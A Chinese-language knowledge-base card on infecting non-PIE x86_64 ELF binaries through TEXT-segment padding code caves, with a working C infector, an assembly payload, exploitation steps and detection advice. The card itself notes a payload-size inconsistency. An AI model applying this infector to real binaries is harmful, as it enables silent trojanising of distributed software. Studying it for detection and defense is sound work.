---
id: code-analysis-reverse-linux-elf-text-padding-parasite-file-size-invariant
title: ELF TEXT 段填充寄生：代码洞注入 + PT_NOTE 改 PT_LOAD 且文件大小不变
type: scenario
domain: code-analysis
path: code-analysis/reverse/linux
technique: elf-text-padding-parasite-infection
tags:
- linux
- elf
- binary-infection
- code-cave
- text-segment
- pt-note
- pt-load
- e-entry
- shellcode
- file-infection
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V94
  verified_at: '2026-11-05T19:54:16+08:00'
  notes: 已对照原文及全部32张图核对：非PIE host TEXT offset=0x1000/filesz=0x159/align=0x1000、代码洞[0x1159,0x2000)=3751B、载荷写入0x1159、PT_NOTE(0x350)→PT_LOAD(0x1159,R+X)、e_entry 0x401040→0x401159、运行先输出PARASITE标记再宿主两行、文件15776B不变/MD5改变、strace三次write与gdb 0x401159→0x401040 均与原文/截图一致。问题：原文载荷有79B与85B两个版本——nasm对mov rax,1优化为5B的mov eax,1得79B(图08)，而感染器C数组用48 c7 c0(7B)得85B(图13/29)，OEP偏移分别40/46；卡片PoC同时引用asm与85B验证但未说明此差异，照asm重编译会得到79B致OEP_PATCH_OFFSET对不上。该点不影响技术原理，但复现需以原文C数组(85B/OEP偏移46)为准。未验证点：PoC未本机复跑；原文无组件受影响版本，未设versions；frontmatter无sources/source_url。
url: /docs/code-analysis/reverse/linux/code-analysis-reverse-linux-elf-text-padding-parasite-file-size-invariant/
draft: false
kb_aliases:
- 幻核-3
- TEXT 段填充感染
- ELF code cave 感染
- 文件大小不变注入
- Silvio Cesare segment padding
- ELF 二进制寄生
- section padding infection
---

## 一句话结论

非 PIE 的 x86_64 ELF 中，TEXT 的 `PT_LOAD` 段末尾到页对齐边界之间通常有一段全零填充（代码洞）；把不超过洞大小的 shellcode 写进这段已有空间，把无用的 `PT_NOTE` 头改写为指向该洞的 `PT_LOAD`（R+X），再把 `e_entry` 指向洞内载荷，即可在不改变文件大小的情况下让程序启动时先执行载荷、随后跳回原入口继续正常运行；文件功能与大小不变，只有哈希/内容改变。

## 原理

- ELF 同时维护 section（面向链接器/工具链）与 segment（面向内核加载器）两套视图。`execve` 时内核只解析 Program Header Table；section header 可以被 `strip` 删除而不影响运行。因此修改 program header 中的几十个字节就能改变加载行为，section 视图仍可能显示正常。
- TEXT 段是一个可执行 `PT_LOAD`，其 `p_align` 通常为 `0x1000`。段在文件中的实际结束位置 `p_offset + p_filesz` 往往不是页边界，到下一个页边界之间的字节是链接器/对齐产生的零填充。公式：
  `cave_size = ALIGN_UP(p_offset + p_filesz, p_align) - (p_offset + p_filesz)`。
  这段区域已在文件中、内容为零，写入载荷不会增加文件大小；它位于 TEXT 段文件范围内，若被映射则天然带 R+X 权限。
- 但仅把代码放进 TEXT 的 padding 不一定能被加载：部分加载器实现会严格按 TEXT 的 `p_filesz`/`p_memsz` 限定映射边界，padding 可能不在映射区间。于是复用 `PT_NOTE` 槽位：`PT_NOTE` 只承载 `.note.ABI-tag`/`.note.gnu.build-id` 等元数据，对运行不必要；把它的 `p_type` 改为 `PT_LOAD`、`p_flags` 改为 `PF_R|PF_X`、`p_offset` 指向代码洞、`p_vaddr` 指向载荷虚拟地址、`p_filesz/p_memsz` 设为载荷长度、`p_align=0x1000`，即可让内核把代码洞作为独立可执行段映射。
- 把 ELF header 的 `e_entry` 改成载荷虚拟地址，内核加载完成后首先执行载荷；载荷最后用绝对跳转回到原始 `e_entry`（OEP），宿主逻辑继续运行，对用户透明。
- 载荷需要保存/恢复寄存器：`syscall` 会破坏 `rcx` 与 `r11`，glibc 初始化还依赖 `rdx` 等寄存器；不恢复可能让宿主在 `_start` 阶段崩溃。数据用 RIP 相对 `lea` 定位以保持位置无关；OEP 用 8 字节哨兵 `0xAAAAAAAAAAAAAAAA` 占位，感染器写入文件前把它 patch 成原入口点。回跳使用 `mov rax, imm64; jmp rax`，因为 OEP 与载荷的距离可能超过 `jmp rel32` 的 ±2GB 范围。
- 因载荷写在原有零填充中，感染前后文件大小完全一致；改变的只有 `e_entry`（8 字节）、`PT_NOTE` 头的若干字段以及代码洞中被覆盖的零字节，文件哈希必然改变，但 `ls -l` 看不出大小差异。

## 触发条件

- 目标为 x86_64 ELF，且是 `ET_EXEC`（非 PIE）；PIE 目标需要额外处理运行基址或改用相对跳转。
- 目标至少有一个 `PT_NOTE` program header；TEXT 段尾部的对齐填充（代码洞）大于等于载荷长度，且该区域为全零、不与后续段数据重叠。
- 攻击者能修改最终分发的二进制或构建产物（供应链、下载站、镜像、制品库、本地可写文件等）并有执行权限。
- 目标未启用 IMA/EVM、代码签名或逐字节完整性校验，或攻击者能同时绕过。
- 代码洞所在文件偏移与载荷虚拟地址满足 `p_offset % p_align == p_vaddr % p_align`（本例两者同在 0x1000 页内，天然满足）。

## 利用步骤

1. `readelf -h` 确认 ELF64、`ET_EXEC`、原 `e_entry`；`readelf -l` 找到可执行 `PT_LOAD`（TEXT）与其 `p_offset/p_vaddr/p_filesz/p_align`，再找第一个 `PT_NOTE`。
2. 计算代码洞：起点 `p_offset + p_filesz`，终点 `ALIGN_UP(起点, p_align)`，可用大小 = 终点 - 起点；检查该区间全零（防止重复感染或数据重叠）。
3. 编写 x86_64 载荷：保存 `rax/rcx/rdx/rsi/rdi/r11` → 执行动作（示例 `write(1, msg, len)` 打印标记）→ 恢复寄存器 → `mov rax, OEP; jmp rax`。用 `nasm -f bin` 编译为纯二进制，`xxd -i` 转 C 数组。
4. 感染器 `mmap` 目标文件（`PROT_READ|PROT_WRITE, MAP_SHARED`），校验 ELF 魔数/64 位/`ET_EXEC`/TEXT 段/PT_NOTE/代码洞大小/零填充。
5. 在内存中的载荷数组里把 OEP 哨兵 patch 为原 `e_entry`；将载荷 `memcpy` 到代码洞偏移；计算载荷虚拟地址 = `TEXT.p_vaddr + TEXT.p_filesz`。
6. 改写 `PT_NOTE` 头为 `PT_LOAD`：`p_type=1`、`p_flags=PF_R|PF_X`、`p_offset=代码洞偏移`、`p_vaddr=p_paddr=载荷虚拟地址`、`p_filesz=p_memsz=载荷长度`、`p_align=0x1000`。
7. 把 ELF header 的 `e_entry` 改为载荷虚拟地址；`msync(MS_SYNC)` 落盘，保持文件大小不变。
8. 运行感染后的程序：应先看到载荷输出，再看到宿主原输出，退出码不变；用 `readelf -l`/`strace`/gdb 验证 `PT_NOTE→PT_LOAD`、入口点与回跳 OEP。

## PoC

感染器关键逻辑（C，节选；完整源码见原文）：

```c
#define ALIGN_UP(x, align) (((x) + (align) - 1) & ~((align) - 1))

Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
Elf64_Phdr *phdr = (Elf64_Phdr *)(map + ehdr->e_phoff);
Elf64_Phdr *text = NULL, *note = NULL;
for (int i = 0; i < ehdr->e_phnum; i++) {
    if (phdr[i].p_type == PT_LOAD && (phdr[i].p_flags & PF_X)) text = &phdr[i];
    if (phdr[i].p_type == PT_NOTE && !note) note = &phdr[i];
}

uint64_t cave_off  = text->p_offset + text->p_filesz;
uint64_t cave_end  = ALIGN_UP(cave_off, text->p_align);
uint64_t cave_size = cave_end - cave_off;
uint64_t payload_vaddr = text->p_vaddr + text->p_filesz;
if (cave_size < PARASITE_SIZE) return -1;

uint64_t oep = ehdr->e_entry;
memcpy(&parasite_code[OEP_PATCH_OFFSET], &oep, sizeof(oep));  // patch 哨兵
memcpy(map + cave_off, parasite_code, PARASITE_SIZE);          // 写入代码洞

note->p_type   = PT_LOAD;
note->p_flags  = PF_R | PF_X;
note->p_offset = cave_off;
note->p_vaddr  = payload_vaddr;
note->p_paddr  = payload_vaddr;
note->p_filesz = PARASITE_SIZE;
note->p_memsz  = PARASITE_SIZE;
note->p_align  = 0x1000;

ehdr->e_entry = payload_vaddr;   // 入口劫持
msync(map, st.st_size, MS_SYNC); // 文件大小不变
```

```asm
; nasm -f bin -o parasite.bin parasite.asm
BITS 64
_start:
    push rax
    push rcx
    push rdx
    push rsi
    push rdi
    push r11
    mov rax, 1              ; write
    mov rdi, 1              ; stdout
    lea rsi, [rel msg]      ; RIP 相对
    mov rdx, msg_len
    syscall
    pop r11
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rax
    mov rax, 0xAAAAAAAAAAAAAAAA  ; 感染器 patch 为原 e_entry
    jmp rax
msg: db "[PARASITE] Payload executed.", 10
msg_len equ $ - msg
```

```text
原文验证（非 PIE host，15776 bytes）：
  TEXT: offset=0x1000, filesz=0x159, align=0x1000
  代码洞: [0x1159, 0x2000), 3751 bytes；载荷 85 bytes
  e_entry: 0x401040 -> 0x401159；PT_NOTE -> PT_LOAD (R+X)
  运行输出: 先 [PARASITE] 标记，再宿主原两行；文件大小 15776 不变，MD5 改变
  改动约 82 字节（占 0.52%）
```

## 变体与关联

- 变体：32 位 ELF 使用 `Elf32_Ehdr/Elf32_Phdr` 布局与 4 字节 `e_entry`；PIE 目标需按运行基址计算载荷与 OEP，或改用相对跳转/运行时定位。
- 变体：不改 `e_entry`，改 `.init_array`/GOT/PLT 等初始化路径可避开入口点异常，但会改到 section/代码内容，留下其他痕迹。
- 变体：静默载荷只跳回 OEP、不输出，行为与原程序一致；但 `PT_NOTE` 缺失/微型 LOAD/入口点落在 padding 仍是静态特征。
- 对比：既有 [[code-analysis-reverse-linux-elf-pt-note-to-load-injection]] 把 shellcode **追加到文件末尾**，文件会变大；本卡利用 **TEXT 段尾部已有零填充**，文件大小不变，这是两者的核心区别。
- 关联：[[defense-detection-elf-pt-note-hijack-static-detection]]（PT_NOTE 劫持静态检测）、[[code-analysis-reverse-linux-elf-section-header-zeroing]]（section/segment 双视图盲区）、[[code-analysis-reverse-windows-pe-text-code-cave-call-rel32-patch]]（PE 侧同类代码空洞注入）。
- 边界：代码洞必须足够大且全零；TEXT 的 `p_filesz/p_memsz` 与 `p_align` 因编译器/链接器而异；`PT_NOTE` 可能不存在；修改 `e_entry` 本身显眼；IMA/EVM/签名/哈希基线会检测任何字节改动；示例依赖 `-no-pie` 固定地址。

## 检测与防御

- 静态检测：
  - `readelf -l` 中 `PT_NOTE` 缺失或被改为 `PT_LOAD`；或出现 `p_filesz` 很小、权限 R+X、`p_offset` 落在 TEXT 文件范围内的异常 LOAD 段。
  - `e_entry` 不在正常 `.text`/`_start` 区域，而指向 TEXT 段末尾的填充地址；用 `readelf -h` 与 `readelf -S` 对比入口点与 `.text` 范围。
  - 代码洞区域出现非零字节；可用 `hexdump`/脚本检查 TEXT 尾部对齐填充。
  - YARA：ELF 魔数 + `mov rax, imm64; jmp rax`（`48 b8 ??.. ?? ff e0`）+ `write` 系统调用序列；结合入口点范围判断。
- 运行时检测：`/proc/<pid>/maps` 中出现同一文件映射出的额外 R+X 段、入口点不在主映像；eBPF 挂 `sched_process_exec`/`sys_enter_execve` 做 ELF 结构校验。
- 防御：IMA/EVM、代码签名、包管理器校验（`dpkg --verify`、`rpm -Va`）、发布物 SHA256 基线；限制制品库/分发渠道写权限；可复现构建；不要只依赖 `file`/`readelf -S` 的 section 视图。
